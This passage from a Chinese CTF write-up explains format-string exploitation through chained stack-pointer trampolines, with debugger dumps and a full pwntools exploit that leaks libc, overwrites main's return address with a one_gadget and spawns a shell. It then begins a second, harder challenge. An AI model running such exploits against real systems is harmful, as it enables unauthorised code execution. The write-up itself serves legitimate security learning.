0x1c</span><br><span class="line">26:0130│+130     0x7ffcaf1e8810 ◂— 1</span><br><span class="line">27:0138│ r12     0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x100</span><br></pre></td></tr></table></figure><p>可以看到<code>p1</code>指针已经修改到了<code>i</code>在栈上的高字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0c:0060│+060     0x7ffcaf1e8740 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x100</span><br><span class="line">...</span><br><span class="line">27:0138│ r12     0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x100</span><br></pre></td></tr></table></figure><p>接着第二步，利用<code>p1</code>修改<code>i</code>的符号位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xff</span>).encode() + <span class="string">b&quot;%47$hhn&quot;</span> <span class="comment">#修改i符号位</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>我们看效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000│ rbp rsp 0x7ffcaf1e86e0 —▸ 0x7ffcaf1e8700 ◂— 1</span><br><span class="line">01:0008│+008     0x7ffcaf1e86e8 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">02:0010│+010     0x7ffcaf1e86f0 ◂— 0x1000</span><br><span class="line">03:0018│+018     0x7ffcaf1e86f8 ◂— 0xff00000400401110</span><br><span class="line">04:0020│+020     0x7ffcaf1e8700 ◂— 1</span><br><span class="line">05:0028│+028     0x7ffcaf1e8708 —▸ 0x79b4da629d90 (__libc_start_call_main+128) ◂— mov edi, eax</span><br><span class="line">06:0030│+030     0x7ffcaf1e8710 ◂— 0</span><br><span class="line">07:0038│+038     0x7ffcaf1e8718 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">08:0040│+040     0x7ffcaf1e8720 ◂— 0x1af1e8800</span><br><span class="line">09:0048│+048     0x7ffcaf1e8728 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x1ff</span><br><span class="line">0a:0050│+050     0x7ffcaf1e8730 ◂— 0</span><br><span class="line">0b:0058│+058     0x7ffcaf1e8738 ◂— 0xa80c940d072fe83d</span><br><span class="line">0c:0060│+060     0x7ffcaf1e8740 —▸ 0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x1ff</span><br><span class="line">0d:0068│+068     0x7ffcaf1e8748 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0e:0070│+070     0x7ffcaf1e8750 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">0f:0078│+078     0x7ffcaf1e8758 —▸ 0x79b4da8e6040 (_rtld_global) —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">10:0080│+080     0x7ffcaf1e8760 ◂— 0x57f5ca30090de83d</span><br><span class="line">11:0088│+088     0x7ffcaf1e8768 ◂— 0x5b6520c83da5e83d</span><br><span class="line">12:0090│+090     0x7ffcaf1e8770 ◂— 0x79b400000000</span><br><span class="line">13:0098│+098     0x7ffcaf1e8778 ◂— 0</span><br><span class="line">... ↓            3 skipped</span><br><span class="line">17:00b8│+0b8     0x7ffcaf1e8798 ◂— 0x10b499ce6a95af00</span><br><span class="line">18:00c0│+0c0     0x7ffcaf1e87a0 ◂— 0</span><br><span class="line">19:00c8│+0c8     0x7ffcaf1e87a8 —▸ 0x79b4da629e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1a:00d0│+0d0     0x7ffcaf1e87b0 —▸ 0x7ffcaf1e8828 —▸ 0x7ffcaf1e9096 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">1b:00d8│+0d8     0x7ffcaf1e87b8 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1c:00e0│+0e0     0x7ffcaf1e87c0 —▸ 0x79b4da8e72e0 ◂— 0</span><br><span class="line">1d:00e8│+0e8     0x7ffcaf1e87c8 ◂— 0</span><br><span class="line">1e:00f0│+0f0     0x7ffcaf1e87d0 ◂— 0</span><br><span class="line">1f:00f8│+0f8     0x7ffcaf1e87d8 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">20:0100│+100     0x7ffcaf1e87e0 —▸ 0x7ffcaf1e8810 ◂— 1</span><br><span class="line">21:0108│+108     0x7ffcaf1e87e8 ◂— 0</span><br><span class="line">22:0110│+110     0x7ffcaf1e87f0 ◂— 0</span><br><span class="line">23:0118│+118     0x7ffcaf1e87f8 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">24:0120│+120     0x7ffcaf1e8800 —▸ 0x7ffcaf1e8808 ◂— 0x1c</span><br><span class="line">25:0128│+128     0x7ffcaf1e8808 ◂— 0x1c</span><br><span class="line">26:0130│+130     0x7ffcaf1e8810 ◂— 1</span><br><span class="line">27:0138│ r12     0x7ffcaf1e8818 —▸ 0x7ffcaf1e86ff ◂— 0x1ff</span><br><span class="line">pwndbg&gt; x/dw 0x7ffcaf1e86f8+4</span><br><span class="line">0x7ffcaf1e86fc: -16777212</span><br></pre></td></tr></table></figure><p>可以看到<code>i</code>已经被修改成了一个大负数<code>-16777212</code><br>后续思路便是不断修改<code>p2</code>指针指向，再通过<code>p1</code>来修改数据，将<code>main</code>返回地址修改为<code>one_gadget</code><br>我们找到一个合适的<code>one_gadget</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x48 is writable</span><br><span class="line">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br></pre></td></tr></table></figure><p>其条件<code>rax == NULL</code>这里已经满足，因为<code>main</code>函数return 0会将<code>rax</code>置0，然后<code>address rbp-0x48 is writable</code>以及<code>[[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</code>就需要我们再通过调试，将<code>rbp</code>修改为栈上合适的值（也是通过<code>p2</code>和<code>p1</code>的组合技来修改，后来才知道这个打法叫“诸葛连弩”，还是很形象的）<br>最后要使<code>main</code>返回的话只需要在<code>talk</code>函数中最后不发送八字节数据，发送一个‘0’即可<br>放上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">56167</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.8/amd64/libc6-dbg_2.35-0ubuntu3.8_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.8/amd64/glibc-source_2.35-0ubuntu3.8_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">b talk</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line">payload=<span class="string">b&#x27;%8$p%33$p&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr=stack_addr-<span class="number">0x18</span>+<span class="number">0x20</span></span><br><span class="line">i_addr=ret_addr+<span class="number">0x10</span>-<span class="number">0x20</span></span><br><span class="line">log.success(<span class="string">&quot;ret_addr in stack--&gt;&quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">log.success(<span class="string">&quot;i_addr in stack--&gt;&quot;</span>+<span class="built_in">hex</span>(i_addr))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">libc_base=libc_start_main-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((i_addr &amp; <span class="number">0xffff</span>) + <span class="number">7</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向i的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xff</span>).encode() + <span class="string">b&quot;%47$hhn&quot;</span> <span class="comment">#修改i符号位</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向main返回地址的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">backdoor=libc_base+<span class="number">0xebd3f</span> <span class="comment">#one_gadget</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="comment">#constraints:</span></span><br><span class="line">  <span class="comment">#address rbp-0x48 is writable</span></span><br><span class="line">  <span class="comment">#rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line">  <span class="comment">#[[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%47$hn&quot;</span> <span class="comment">#修改main返回地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((ret_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向main返回地址的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((backdoor &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%47$hn&quot;</span> <span class="comment">#修改main返回地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">rbp_addr=ret_addr-<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(rbp_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向main的rbp的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">rbp=ret_addr+<span class="number">0x80</span>-<span class="number">0x8</span> <span class="comment">#找合适的rbp值</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(rbp &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%47$hn&quot;</span> <span class="comment">#修改rbp</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((rbp_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向main的rbp的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((rbp &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%47$hn&quot;</span> <span class="comment">#修改rbp</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((rbp_addr &amp; <span class="number">0xffff</span>) + <span class="number">4</span>).encode() + <span class="string">b&quot;%17$hn&quot;</span> <span class="comment">#修改跳板指向main的rbp的栈上地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((rbp &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%47$hn&quot;</span> <span class="comment">#修改rbp</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;him...&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;battle!&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>) <span class="comment">#最后不发8字节使main返回</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>看本地效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x22 bytes:</span><br><span class="line">    b&quot;You&#x27;ve been eaten by the monster.\n&quot;</span><br><span class="line">You&#x27;ve been eaten by the monster.</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b&#x27;ls\n&#x27;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    b&#x27;exp.py\tld-linux-x86-64.so.2  libc.so.6  pwn  pwn_patched\n&#x27;</span><br><span class="line">exp.py  ld-linux-x86-64.so.2  libc.so.6  pwn  pwn_patched</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>远程也可打通</p><h2 id="0x03-比较极限的情况"><a href="#0x03-比较极限的情况" class="headerlink" title="0x03 比较极限的情况"></a>0x03 比较极限的情况</h2><p>第六届强网拟态线下赛的一道题目</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先给出了栈地址的低二字节，然后什么都没有了<br>第一想法就是打指针跳板，调试可以看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">06:0030│+018 0x7fffffffdbb8 —▸ 0x7fffffffdc98 —▸ 0x7fffffffdf83 ◂— &#x27;/home/r3t2/ctf/temp/pwn_patched&#x27;</span><br><span class="line">...</span><br><span class="line">16:00b0│+098 0x7fffffffdc38 —▸ 0x7fffffffdca8 —▸ 0x7fffffffdfa3 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br></pre></td></tr></table></figure><p>这两条链，同时还有个发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17:00b8│+0a0 0x7fffffffdc40 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f</span><br></pre></td></tr></table></figure><p>这是一个指向<code>link_map</code>结点的指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7ffe190</span><br><span class="line">00:0000│  0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f</span><br><span class="line">01:0008│  0x7ffff7ffe198 —▸ 0x7ffff7ffe730 ◂— 0</span><br><span class="line">02:0010│  0x7ffff7ffe1a0 —▸ 0x555555557d98 (_DYNAMIC) ◂— 1</span><br><span class="line">03:0018│  0x7ffff7ffe1a8 —▸ 0x7ffff7ffe740 —▸ 0x7ffff7fcd000 ◂— jg 0x7ffff7fcd047</span><br><span class="line">04:0020│  0x7ffff7ffe1b0 ◂— 0</span><br><span class="line">05:0028│  0x7ffff7ffe1b8 —▸ 0x7ffff7ffe190 —▸ 0x555555554000 ◂— 0x10102464c457f</span><br><span class="line">06:0030│  0x7ffff7ffe1c0 ◂— 0</span><br><span class="line">07:0038│  0x7ffff7ffe1c8 —▸ 0x7ffff7ffe718 —▸ 0x7ffff7ffe730 ◂— 0</span><br></pre></td></tr></table></figure><p>确实符合特点，但是这题打这个是打不通的，遂放弃<br>所以还是打指针跳板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001223                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000001228                 lea     rax, buf</span><br><span class="line">.text:000000000000122F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000001232                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000001237                 call    _read</span><br><span class="line">.text:000000000000123C                 lea     rax, buf</span><br><span class="line">.text:0000000000001243                 mov     rdi, rax        ; format</span><br><span class="line">.text:0000000000001246                 mov     eax, 0</span><br><span class="line">.text:000000000000124B                 call    _printf</span><br><span class="line">.text:0000000000001250                 mov     edi, 0          ; status</span><br><span class="line">.text:0000000000001255                 call    __exit</span><br></pre></td></tr></table></figure><p>可以看到这里<code>fmtstr</code>利用一次后没有其他机会，马上<code>call __exit</code>，那我们就只能修改<code>printf</code>自身的返回地址到调用<code>read</code>前，这样才可能多次利用，这需要两条指针跳板链，为什么呢？因为一条用来修改<code>printf</code>的返回地址，一条用来布置<code>one_gadget</code><br>这时又出现了奇怪的现象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(printf_ret).encode() + <span class="string">b&quot;%11$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x10000</span> - printf_ret + <span class="number">0x23</span>).encode() + <span class="string">b&quot;%39$hhn&quot;</span></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>最初我是这样写的，调试发现仅仅成功修改了跳板，而目标，也就是<code>printf</code>的返回地址却没有修改到，后续当然就做不出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 